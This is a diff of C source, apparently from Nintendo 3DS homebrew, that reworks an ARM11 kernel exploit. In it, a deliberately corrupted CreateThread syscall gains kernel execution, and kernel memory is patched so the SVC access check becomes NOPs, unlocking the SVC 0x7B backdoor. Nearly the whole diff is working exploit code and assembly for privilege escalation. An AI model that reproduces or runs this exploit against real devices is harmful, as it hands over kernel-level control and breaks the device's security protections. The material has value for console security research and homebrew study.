@@ -5,12 +5,17 @@
 #include <malloc.h>
 #include <dirent.h>
 
-u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
-unsigned int patch_addr;
-unsigned int svc_patch_addr;
-unsigned char patched_svc = 0;
+#include "utils.h"
+
+u32 patch_addr;
+u32 svc_patch_addr;
+
+bool patched_svc = false;
+
 u32 *backup;
-unsigned int *arm11_buffer;
+u32 *arm11_buffer;
+
+u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 
 // Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
@@ -196,51 +201,39 @@ int arm11_kernel_exploit_setup(void)
 int __attribute__((naked))
 arm11_kernel_exploit_exec (int (*func)(void))
 {
-	__asm__ ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
-			 "bx lr\t\n");
+	asm volatile ("svc 8 \t\n" // CreateThread syscall, corrupted, args not needed
+				  "bx lr \t\n");
 }
 
-int __attribute__((naked))
-arm11_kernel_execute(int (*func)(void))
-{
-	__asm__ ("svc #0x7B\t\n"
-			 "bx lr\t\n");
-}
 
 void test(void)
 {
 	arm11_buffer[0] = 0xFAAFFAAF;
 }
 
-arm11_kernel_exec (void)
+int __attribute__((naked))
+arm11_patch_kernel(void)
 {
+	asm volatile ("add sp, sp, #8 \t\n");
+
 	arm11_buffer[0] = 0xF00FF00F;
 
 	// fix up memory
-	*(int *)(patch_addr+8) = 0x8DD00CE5;
+	*(vu32*)(patch_addr + 8) = 0x8DD00CE5;
 
-	// give us access to all SVCs (including 0x7B, so we can return to kernel mode) 
-	if(svc_patch_addr > 0)
+	// give us access to all SVCs (including 0x7B, so we can return to kernel mode)
+	if (svc_patch_addr > 0)
 	{
-		*(int *)(svc_patch_addr) = 0xE320F000; //NOP
-		*(int *)(svc_patch_addr+8) = 0xE320F000; //NOP
-		patched_svc = 1;
+		*(vu32*)(svc_patch_addr) = 0xE320F000; // NOP
+		*(vu32*)(svc_patch_addr + 8) = 0xE320F000; // NOP
+		patched_svc = true;
 	}
+
 	InvalidateEntireInstructionCache();
 	InvalidateEntireDataCache();
 
-	return 0;
-}
-
-int __attribute__((naked))
-arm11_kernel_stub (void)
-{
-	__asm__ ("add sp, sp, #8\t\n");
-
-	arm11_kernel_exec ();
-
-	__asm__ ("movs r0, #0\t\n"
-			 "ldr pc, [sp], #4\t\n");
+	asm volatile ("movs r0, #0      \t\n"
+				  "ldr pc, [sp], #4 \t\n");
 }
 
 int doARM11Hax()
@@ -277,23 +270,18 @@ int doARM11Hax()
 		arm11_buffer[i] = 0xdeadbeef;
 	}
 
-	if(arm11_kernel_exploit_setup())
+	if (arm11_kernel_exploit_setup())
 	{
 		dbg_log("Kernel exploit set up\n");
 
-		arm11_kernel_exploit_exec (arm11_kernel_stub);
-		//if(patched_svc > 0)
+		arm11_kernel_exploit_exec(arm11_patch_kernel);
+		dbg_log("ARM11 Kernel code executed\n");
+
+		if (patched_svc)
 		{
-#ifdef DEBUG_PROCESS
-			printf("Testing SVC 0x7B\n");
-#endif
-			arm11_kernel_execute (test);
+			dbg_log("Testing SVC 0x7B\n");
+			svcBackdoor(test);
 		}
-
-#ifdef DEBUG_PROCESS
-		printf("ARM11 Kernel Code Executed\n");
-#endif
-
 	}
 #ifdef DEBUG_PROCESS
 	else
